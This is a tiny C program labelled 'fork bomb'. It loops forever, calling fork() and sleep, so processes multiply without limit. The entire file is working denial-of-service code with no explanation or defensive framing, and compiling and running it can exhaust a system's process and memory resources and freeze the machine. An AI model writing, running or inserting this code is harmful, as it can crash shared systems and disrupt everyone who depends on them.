// fork bomb

#include <stdlib.h>
#include <unistd.h>

int main(){
	while(1){
		fork();
		system("sleep 10");
	}
}
